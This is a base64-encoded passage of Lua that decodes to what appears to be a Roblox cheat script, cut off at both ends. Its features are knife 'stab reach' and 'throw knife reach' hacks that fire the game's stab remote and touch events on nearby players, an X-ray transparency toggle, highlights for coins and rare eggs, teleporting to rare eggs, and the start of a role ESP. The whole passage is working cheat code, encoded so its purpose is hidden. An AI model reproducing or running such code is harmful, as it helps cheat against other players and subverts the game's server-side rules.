gZy5jZmcubWF0ID0gRW51bS5NYXRlcmlhbFt2XQplbmQpCgpMaWJyYXJ5LkFkZENvbG9yUGlja2VyKHRhYjIsICJTZWxlY3QgYSBjb2xvciIsIGcuY2ZnLmNvbCwgZnVuY3Rpb24oYykKICAgIGcuY2ZnLmNvbCA9IGMKZW5kKQoKTGlicmFyeS5hZGRMYWJlbCh0YWIyLCAiU3RhYiByZWFjaCIpCgpnZXRnZW52KCkucmVhY2hLbmlmZUFjdGl2ZSA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5yZWFjaEtuaWZlQWN0aXZlIG9yIGZhbHNlCmdldGdlbnYoKS5rbmlmZVJlYWNoQWRqdXN0ID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLmtuaWZlUmVhY2hBZGp1c3Qgb3IgOAoKTGlicmFyeS5hZGRUb2dnbGUodGFiMiwgIlN0YWIgcmVhY2giLCAiIiwgZ2V0Z2VudigpLnJlYWNoS25pZmVBY3RpdmUsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLnJlYWNoS25pZmVBY3RpdmUgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnJlYWNoS25pZmVBY3RpdmUgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZFNsaWRlcih0YWIyLCAiU3RhYiByZWFjaCBhZGp1c3QiLCAiU3RhYiByZWFjaCBhZGp1c3QiLCAxLCAyNTUsIGdldGdlbnYoKS5rbmlmZVJlYWNoQWRqdXN0LCBmdW5jdGlvbih2YWx1ZSkKICAgIGdldGdlbnYoKS5rbmlmZVJlYWNoQWRqdXN0ID0gdG9udW1iZXIodmFsdWUpCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcua25pZmVSZWFjaEFkanVzdCA9IHZhbHVlCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCmVuZCkKCmdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGlmIGdldGdlbnYoKS5yZWFjaEtuaWZlQWN0aXZlIHRoZW4KICAgICAgICBsb2NhbCBsb2NhbFBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGlmIGxvY2FsUGxheWVyIGFuZCBsb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICBsb2NhbCBsb2NhbENoYXJhY3RlciA9IGxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCBsb2NhbFJvb3QgPSBsb2NhbENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGxvY2FsIGtuaWZlID0gbG9jYWxDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIktuaWZlIikKICAgICAgICAgICAgaWYga25pZmUgYW5kIGxvY2FsUm9vdCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBzdGFiRXZlbnQgPSBrbmlmZTpGaW5kRmlyc3RDaGlsZCgiU3RhYiIpCiAgICAgICAgICAgICAgICBpZiBzdGFiRXZlbnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNsb3Nlc3RQbGF5ZXIgPSBuaWwKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzaG9ydGVzdERpc3RhbmNlID0gZ2V0Z2VudigpLmtuaWZlUmVhY2hBZGp1c3QKCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoZ2FtZS5QbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGxheWVyIH49IGxvY2FsUGxheWVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFJvb3QgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldFJvb3QgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3RhbmNlID0gKGxvY2FsUm9vdC5Qb3NpdGlvbiAtIHRhcmdldFJvb3QuUG9zaXRpb24pLk1hZ25pdHVkZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXN0YW5jZSA8PSBnZXRnZW52KCkua25pZmVSZWFjaEFkanVzdCBhbmQgZGlzdGFuY2UgPCBzaG9ydGVzdERpc3RhbmNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xvc2VzdFBsYXllciA9IHBsYXllcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaG9ydGVzdERpc3RhbmNlID0gZGlzdGFuY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgY2xvc2VzdFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFJvb3QgPSBjbG9zZXN0UGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldFJvb3QgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsgWzFdID0gIlNsYXNoIiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFiRXZlbnQ6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh0YXJnZXRSb290LCBrbmlmZS5IYW5kbGUsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh0YXJnZXRSb290LCBrbmlmZS5IYW5kbGUsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkTGFiZWwodGFiMiwgIlRocm93IEtuaWZlIFJlYWNoIikKCmdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIHRhc2sud2FpdCgyKQogICAgZm9yIF8sIG9iaiBpbiBpcGFpcnMod29ya3NwYWNlOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgb2JqOklzQSgiTW9kZWwiKSBhbmQgb2JqLk5hbWUgPT0gIlRocm93aW5nS25pZmUiIHRoZW4KICAgICAgICAgICAgb2JqOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmdldGdlbnYoKS50aHJvd2luZ0tuaWZlQWN0aXZlID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnRocm93aW5nS25pZmVBY3RpdmUgb3IgZmFsc2UKZ2V0Z2VudigpLnRocm93aW5nS25pZmVSZWFjaCA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy50aHJvd2luZ0tuaWZlUmVhY2ggb3IgOAoKTGlicmFyeS5hZGRUb2dnbGUodGFiMiwgIlRocm93IEtuaWZlIFJlYWNoIiwgIiIsIGdldGdlbnYoKS50aHJvd2luZ0tuaWZlQWN0aXZlLCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS50aHJvd2luZ0tuaWZlQWN0aXZlID0gc3RhdGUKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy50aHJvd2luZ0tuaWZlQWN0aXZlID0gc3RhdGUKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKZW5kKQoKTGlicmFyeS5hZGRTbGlkZXIodGFiMiwgIlRocm93aW5nIEtuaWZlIFJlYWNoIiwgIlRocm93aW5nIEtuaWZlIFJlYWNoIiwgOCwgMjU1LCBnZXRnZW52KCkudGhyb3dpbmdLbmlmZVJlYWNoLCBmdW5jdGlvbih2YWx1ZSkKICAgIGdldGdlbnYoKS50aHJvd2luZ0tuaWZlUmVhY2ggPSB0b251bWJlcih2YWx1ZSkKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy50aHJvd2luZ0tuaWZlUmVhY2ggPSB2YWx1ZQogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaWYgbm90IGdldGdlbnYoKS50aHJvd2luZ0tuaWZlQWN0aXZlIHRoZW4gcmV0dXJuIGVuZAoKICAgIGxvY2FsIGxvY2FsUGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBsb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vdCBjaGFyYWN0ZXIgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgcm9vdCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBsb2NhbCBrbmlmZSA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiS25pZmUiKQogICAgaWYgbm90IChrbmlmZSBhbmQgcm9vdCkgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgc3RhYkV2ZW50ID0ga25pZmU6RmluZEZpcnN0Q2hpbGQoIlN0YWIiKQogICAgc3RhYkV2ZW50OkZpcmVTZXJ2ZXIoIlNsYXNoIikKCiAgICBmb3IgXywgdGhyb3dpbmdLbmlmZSBpbiBpcGFpcnMod29ya3NwYWNlOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdGhyb3dpbmdLbmlmZTpJc0EoIk1vZGVsIikgYW5kIHRocm93aW5nS25pZmUuTmFtZSA9PSAiVGhyb3dpbmdLbmlmZSIgdGhlbgogICAgICAgICAgICBsb2NhbCBibGFkZVBvcyA9IHRocm93aW5nS25pZmU6RmluZEZpcnN0Q2hpbGQoIkJsYWRlUG9zaXRpb24iKQogICAgICAgICAgICBsb2NhbCBrbmlmZVBvcyA9IGJsYWRlUG9zIGFuZCBibGFkZVBvcy5Qb3NpdGlvbiBvciBrbmlmZS5IYW5kbGUuUG9zaXRpb24KCiAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKGdhbWUuUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXIgfj0gbG9jYWxQbGF5ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Um9vdCA9IHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgIGlmIGh1bWFub2lkIGFuZCBodW1hbm9pZC5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGlzdCA9IChrbmlmZVBvcyAtIHRhcmdldFJvb3QuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXN0IDw9IGdldGdlbnYoKS50aHJvd2luZ0tuaWZlUmVhY2ggdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QodGFyZ2V0Um9vdCwga25pZmUuSGFuZGxlLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QodGFyZ2V0Um9vdCwga25pZmUuSGFuZGxlLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpnZXRnZW52KCkueHJheSwgZ2V0Z2VudigpLnNhdmVkLCBnZXRnZW52KCkudHJhbnNwYXJlbmN5TGV2ZWwgPSBmYWxzZSwge30sIDAuNQpsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKCmxvY2FsIGZ1bmN0aW9uIHNldFRyYW5zcGFyZW5jeShvYmopCiAgICBmb3IgXywgdiBpbiBpcGFpcnMob2JqOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgYW5kIG5vdCAodi5QYXJlbnQ6SXNBKCJNb2RlbCIpIGFuZCB2LlBhcmVudDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgYW5kIHYuUGFyZW50IH49IHBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgaWYgZ2V0Z2VudigpLnhyYXkgdGhlbgogICAgICAgICAgICAgICAgZ2V0Z2VudigpLnNhdmVkW3ZdID0gZ2V0Z2VudigpLnNhdmVkW3ZdIG9yIHYuVHJhbnNwYXJlbmN5CiAgICAgICAgICAgICAgICB2LlRyYW5zcGFyZW5jeSA9IGdldGdlbnYoKS50cmFuc3BhcmVuY3lMZXZlbAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBpZiBnZXRnZW52KCkuc2F2ZWRbdl0gdGhlbgogICAgICAgICAgICAgICAgICAgIHYuVHJhbnNwYXJlbmN5LCBnZXRnZW52KCkuc2F2ZWRbdl0gPSBnZXRnZW52KCkuc2F2ZWRbdl0sIG5pbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHNldFRyYW5zcGFyZW5jeSh2KQogICAgZW5kCmVuZAoKTGlicmFyeS5hZGRUb2dnbGUodGFiMywgIlhSYXkiLCAiIiwgZmFsc2UsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLnhyYXkgPSBzdGF0ZQogICAgc2V0VHJhbnNwYXJlbmN5KHdvcmtzcGFjZSkKZW5kKQoKTGlicmFyeS5hZGRTbGlkZXIodGFiMywgIlhSYXkgVHJhbnNwYXJlbmN5IiwgIlhSYXkgVHJhbnNwYXJlbmN5IiwgMCwgMTAsIDEsIGZ1bmN0aW9uKHZhbHVlKQogICAgZ2V0Z2VudigpLnRyYW5zcGFyZW5jeUxldmVsID0gdmFsdWUgLyAxMAogICAgaWYgZ2V0Z2VudigpLnhyYXkgdGhlbiBzZXRUcmFuc3BhcmVuY3kod29ya3NwYWNlKSBlbmQKZW5kKQoKZ2V0Z2VudigpLnNlZUNvaW5zID0gZmFsc2UgIApsb2NhbCBhZG9ybnMsIGNvbm5lY3Rpb24gPSB7fSAgCgpsb2NhbCBmdW5jdGlvbiBjcmVhdGVBZG9ybihwYXJ0KSAgCglpZiBub3QgZ2V0Z2VudigpLnNlZUNvaW5zIHRoZW4gcmV0dXJuIGVuZAoJaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgYW5kIG5vdCBhZG9ybnNbcGFydF0gdGhlbiAgCgkJbG9jYWwgYm94ID0gSW5zdGFuY2UubmV3KCJCb3hIYW5kbGVBZG9ybm1lbnQiKSAgCgkJYm94LlNpemUgPSBWZWN0b3IzLm5ldygyLCAyLCAyKSAgCgkJYm94LkNvbG9yMywgYm94LlRyYW5zcGFyZW5jeSwgYm94LkFsd2F5c09uVG9wLCBib3guWkluZGV4LCBib3guQWRvcm5lZSwgYm94LlBhcmVudCA9ICAgCgkJCUNvbG9yMy5mcm9tUkdCKDEwMCwgMjU1LCAxMDApLCAwLjcsIHRydWUsIDEsIHBhcnQsIHBhcnQgIAoJCWFkb3Juc1twYXJ0XSA9IGJveCAgCgllbmQgIAplbmQgIAoKTGlicmFyeS5hZGRUb2dnbGUodGFiMywgIlNlZSBDb2lucyIsICJWZXIgbW9uZWRhcyIsIGZhbHNlLCBmdW5jdGlvbihzdGF0ZSkgIAoJZ2V0Z2VudigpLnNlZUNvaW5zID0gc3RhdGUgIAoJaWYgY29ubmVjdGlvbiB0aGVuIGNvbm5lY3Rpb246RGlzY29ubmVjdCgpIGVuZCAgCglmb3IgXywgdiBpbiBwYWlycyhhZG9ybnMpIGRvIHY6RGVzdHJveSgpIGVuZCAgCgl0YWJsZS5jbGVhcihhZG9ybnMpICAKCglpZiBzdGF0ZSB0aGVuICAKCQlmb3IgXywgY29udGFpbmVyIGluIHBhaXJzKGdhbWUuV29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvICAKCQkJaWYgY29udGFpbmVyOklzQSgiTW9kZWwiKSBhbmQgY29udGFpbmVyLk5hbWUgPT0gIkNvaW5Db250YWluZXIiIHRoZW4gIAoJCQkJZm9yIF8sIHBhcnQgaW4gcGFpcnMoY29udGFpbmVyOkdldENoaWxkcmVuKCkpIGRvIAoJCQkJCWlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIHRoZW4KCQkJCQkJY3JlYXRlQWRvcm4ocGFydCkKCQkJCQllbmQKCQkJCWVuZCAgCgkJCWVuZCAgCgkJZW5kICAKCQljb25uZWN0aW9uID0gZ2FtZS5Xb3Jrc3BhY2UuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oZCkgIAoJCQlpZiBkOklzQSgiQmFzZVBhcnQiKSBhbmQgZC5QYXJlbnQgYW5kIGQuUGFyZW50Lk5hbWUgPT0gIkNvaW5Db250YWluZXIiIHRoZW4gCgkJCQljcmVhdGVBZG9ybihkKSAKCQkJZW5kICAKCQllbmQpICAKCWVuZCAgCmVuZCkKCmdldGdlbnYoKS5UZWxlcG9ydFRvUmFyZUVnZyA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5UZWxlcG9ydFRvUmFyZUVnZyBvciBmYWxzZQpnZXRnZW52KCkuU2VlUmFyZUVnZ3MgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuU2VlUmFyZUVnZ3Mgb3IgZmFsc2UKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCmxvY2FsIGZ1bmN0aW9uIHNldHVwQ2hhcmFjdGVyKGNoYXJhY3RlcikKICAgIHJldHVybiBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKZW5kCgpsb2NhbCBjdXJyZW50SHVtYW5vaWRSb290UGFydCA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgc2V0dXBDaGFyYWN0ZXIoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSBvciBuaWwKCkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hhcmFjdGVyKQogICAgY3VycmVudEh1bWFub2lkUm9vdFBhcnQgPSBzZXR1cENoYXJhY3RlcihjaGFyYWN0ZXIpCmVuZCkKCmxvY2FsIGFkb3JubWVudHMgPSB7fQoKbG9jYWwgZnVuY3Rpb24gbWFya1JhcmVFZ2cocGFydCkKICAgIGlmIGdldGdlbnYoKS5TZWVSYXJlRWdncyBhbmQgbm90IGFkb3JubWVudHNbcGFydF0gdGhlbgogICAgICAgIGxvY2FsIGJveCA9IEluc3RhbmNlLm5ldygiQm94SGFuZGxlQWRvcm5tZW50IikKICAgICAgICBib3guU2l6ZSA9IHBhcnQuU2l6ZQogICAgICAgIGJveC5BZG9ybmVlID0gcGFydAogICAgICAgIGJveC5BbHdheXNPblRvcCA9IHRydWUKICAgICAgICBib3guWkluZGV4ID0gNQogICAgICAgIGJveC5Db2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMCkKICAgICAgICBib3guVHJhbnNwYXJlbmN5ID0gMC4zCiAgICAgICAgYm94LlBhcmVudCA9IHBhcnQKICAgICAgICBhZG9ybm1lbnRzW3BhcnRdID0gYm94CiAgICBlbmQKZW5kCgp3b3Jrc3BhY2UuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ob2JqKQogICAgaWYgb2JqOklzQSgiUGFydGljbGVFbWl0dGVyIikgdGhlbgogICAgICAgIGxvY2FsIGNvaW4gPSBvYmouUGFyZW50CiAgICAgICAgaWYgY29pbiBhbmQgY29pbjpJc0EoIkJhc2VQYXJ0IikgYW5kIGNvaW4uUGFyZW50IGFuZCBjb2luLlBhcmVudC5OYW1lID09ICJDb2luQ29udGFpbmVyIiB0aGVuCiAgICAgICAgICAgIGlmIGdldGdlbnYoKS5TZWVSYXJlRWdncyB0aGVuCiAgICAgICAgICAgICAgICBtYXJrUmFyZUVnZyhjb2luKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgZ2V0Z2VudigpLlRlbGVwb3J0VG9SYXJlRWdnIGFuZCBjdXJyZW50SHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICBjdXJyZW50SHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBjb2luLkNGcmFtZSArIFZlY3RvcjMubmV3KDAsIDMsIDApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmZvciBfLCBjb250YWluZXJIb2xkZXIgaW4gcGFpcnMod29ya3NwYWNlOkdldENoaWxkcmVuKCkpIGRvCiAgICBsb2NhbCBjb2luQ29udGFpbmVyID0gY29udGFpbmVySG9sZGVyOkZpbmRGaXJzdENoaWxkKCJDb2luQ29udGFpbmVyIikKICAgIGlmIGNvaW5Db250YWluZXIgdGhlbgogICAgICAgIGZvciBfLCBjb2luIGluIHBhaXJzKGNvaW5Db250YWluZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgY29pbjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlBhcnRpY2xlRW1pdHRlciIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIGdldGdlbnYoKS5TZWVSYXJlRWdncyB0aGVuCiAgICAgICAgICAgICAgICAgICAgbWFya1JhcmVFZ2coY29pbikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgZ2V0Z2VudigpLlRlbGVwb3J0VG9SYXJlRWdnIGFuZCBjdXJyZW50SHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgY3VycmVudEh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gY29pbi5DRnJhbWUgKyBWZWN0b3IzLm5ldygwLCAzLCAwKQogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKTGlicmFyeS5hZGRUb2dnbGUodGFiMywgIlRlbGVwb3J0IHRvIFJhcmUgRWdnIiwgIiIsIGdldGdlbnYoKS5UZWxlcG9ydFRvUmFyZUVnZywgZnVuY3Rpb24obikKICAgIGdldGdlbnYoKS5UZWxlcG9ydFRvUmFyZUVnZyA9IG4KICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5UZWxlcG9ydFRvUmFyZUVnZyA9IG4KICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKICAgIGlmIG4gYW5kIGN1cnJlbnRIdW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICBmb3IgXywgY29udGFpbmVySG9sZGVyIGluIHBhaXJzKHdvcmtzcGFjZTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBsb2NhbCBjb2luQ29udGFpbmVyID0gY29udGFpbmVySG9sZGVyOkZpbmRGaXJzdENoaWxkKCJDb2luQ29udGFpbmVyIikKICAgICAgICAgICAgaWYgY29pbkNvbnRhaW5lciB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgY29pbiBpbiBwYWlycyhjb2luQ29udGFpbmVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgY29pbjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlBhcnRpY2xlRW1pdHRlciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudEh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gY29pbi5DRnJhbWUgKyBWZWN0b3IzLm5ldygwLCAzLCAwKQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIzLCAiU2VlIFJhcmUgRWdncyIsICIiLCBnZXRnZW52KCkuU2VlUmFyZUVnZ3MsIGZ1bmN0aW9uKG4pCiAgICBnZXRnZW52KCkuU2VlUmFyZUVnZ3MgPSBuCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuU2VlUmFyZUVnZ3MgPSBuCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCgogICAgaWYgbiB0aGVuCiAgICAgICAgZm9yIF8sIGNvbnRhaW5lckhvbGRlciBpbiBwYWlycyh3b3Jrc3BhY2U6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgbG9jYWwgY29pbkNvbnRhaW5lciA9IGNvbnRhaW5lckhvbGRlcjpGaW5kRmlyc3RDaGlsZCgiQ29pbkNvbnRhaW5lciIpCiAgICAgICAgICAgIGlmIGNvaW5Db250YWluZXIgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIGNvaW4gaW4gcGFpcnMoY29pbkNvbnRhaW5lcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGNvaW46RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJQYXJ0aWNsZUVtaXR0ZXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIG1hcmtSYXJlRWdnKGNvaW4pCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbHNlCiAgICAgICAgZm9yIHBhcnQsIGFkb3JubWVudCBpbiBwYWlycyhhZG9ybm1lbnRzKSBkbwogICAgICAgICAgICBpZiBhZG9ybm1lbnQgdGhlbgogICAgICAgICAgICAgICAgYWRvcm5tZW50OkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICB0YWJsZS5jbGVhcihhZG9ybm1lbnRzKQogICAgZW5kCmVuZCkKCmxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCgpnZXRnZW52KCkuQ2hhbUVTUCA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5DaGFtRVNQIG9yIGZhbHNlCmdldGdlbnYoKS5DaGFtVHJhbnNwYXJlbmN5ID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkNoYW1UcmFuc3BhcmVuY3kgb3IgMC44CmdldGdlbnYoKS5FID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkUgb3IgZmFsc2UKZ2V0Z2VudigpLkggPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuSCBvciBmYWxzZQpnZXRnZW52KCkuVCA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5UIG9yIGZhbHNlCmdldGdlbnYoKS5lQiA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5lQiBvciBmYWxzZQpnZXRnZW52KCkuRiA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5GIG9yIDAuOApnZXRnZW52KCkuUm9sZXMgPSB7fQoKbG9jYWwgbGFzdERhdGEKCmxvY2FsIGZ1bmN0aW9uIGlzRGlmZmVyZW50KHQxLCB0MikKICAgIGlmIHR5cGVvZih0MSkgfj0gdHlwZW9mKHQyKSB0aGVuIHJldHVybiB0cnVlIGVuZAogICAg